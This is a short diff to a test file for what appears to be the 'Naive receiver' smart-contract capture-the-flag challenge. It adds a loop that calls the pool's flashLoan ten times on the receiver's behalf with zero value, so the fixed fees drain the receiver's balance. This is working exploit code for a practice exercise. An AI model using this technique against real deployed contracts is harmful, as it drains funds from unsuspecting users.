@@ -39,6 +39,11 @@ describe("[Challenge] Naive receiver", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // lend with zero value, so receiver still have to pay fixedFee
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, 0)
+        }
     })
 
     after(async function () {
